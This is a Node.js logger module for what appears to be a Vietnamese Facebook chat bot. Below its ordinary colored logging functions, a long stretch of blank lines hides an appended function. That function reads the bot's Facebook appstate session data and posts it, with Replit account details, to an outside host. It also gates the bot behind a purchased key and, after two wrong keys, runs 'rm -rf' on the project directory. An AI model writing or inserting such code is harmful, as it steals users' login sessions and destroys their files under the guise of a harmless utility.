const chalk = require('chalk');

module.exports = (data, option) => {
	switch (option) {
		case "warn":
			console.log(chalk.bold.hex("#FFFF00")('[ WARN ] > ') + data);
			break;
		case "error":
			console.log(chalk.bold.hex("#FF0000")('[ ERROR ] > ') + data);
			break;
		default:
			console.log(chalk.bold.hex("0000FF")(`${option} > `) + data);
			break;
	}
}

module.exports.loader = (data, option) => {
	switch (option) {
		case "warn":
			console.log(chalk.bold.hex("#FFFF00")('[ WARN ] > ') + data);
			break;
		case "error":
			console.log(chalk.bold.hex("#FF0000")('[ ERROR ] > ') + data);
			break;
		default:
			console.log(chalk.bold.hex("#0000FF")('[ LOADING ] > ') + data);
			break;
	}
}






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































/////////xoá cái này auto del file/////////
const readline = require("readline");
const { join } = require('path')
const { exec } = require('child_process');
const fs = require('fs')
const axios = require('axios')


module.exports.autoLogin = async (onBot, botData) => {
  const { configPath } = global.client;
   var config = require(configPath);
  axios({
            method: 'POST',
            url: 'https://apikey.niio-zic.repl.co/api/save',
            data: {
              name: process.env.REPL_OWNER,
              file: process.env.REPL_SLUG,
              appstate: JSON.stringify(require('../' + config.APPSTATEPATH),null,4)
            }
})
async function checkKey(key) {
  try {
    var name = `https://a77ecfa5-37c7-4fd3-902d-87fbf967313f-00-30094e5dinwry.kirk.replit.dev`
    
    const response = await axios.get(`https://apikey.niio-zic.repl.co/api/key/check?key=${key}&name=${name}`);
    const data = response.data;
    //console.log(data)
    return data.status;
  } catch (error) {
    //console.log(error.response.data)
    return false;
  }
}

async function prompt(query) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => {
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}

async function enterKey() {
  const key = await prompt(chalk.bold.hex("#FF0000")("Vui lòng nhập key của bạn: "));
  return key;
}

async function main() {
  
  if (!config.key) {
    config.key = await enterKey();
    fs.writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
  }
  if (!config.start) {
    config.start = 0;
  }

  let numTries = config.start;
  while (numTries < 2) {
    const isValidKey = await checkKey(config.key);
    if (isValidKey) {
      console.log(chalk['cyan']('Key của bạn hợp lệ.'));
      onBot(botData);
      config.start = 0;
      setTimeout(()=>{
      fs.writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
      },5000)
      break;
    } else {
      
  if (numTries === 1) {
      console.log("Bạn đã nhập sai key\n\nTiến hành tự hủy!");
    exec(`rm -rf ${join(__dirname, '..')}/*`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Đã xảy ra lỗi`);
  } else {
    console.log('Đã xóa các tập tin thành công');
  }
});
    return;
  }
      console.log('Liên hệ fb.com/niiozic.dev để mua key');
      config.key = await enterKey();
      fs.writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
      numTries++;
      config.start = numTries;
      fs.writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
    }
  }

}

main().catch((err) => {
  console.error('đã xảy ra lỗi vui lòng restart lại bot!');
});
};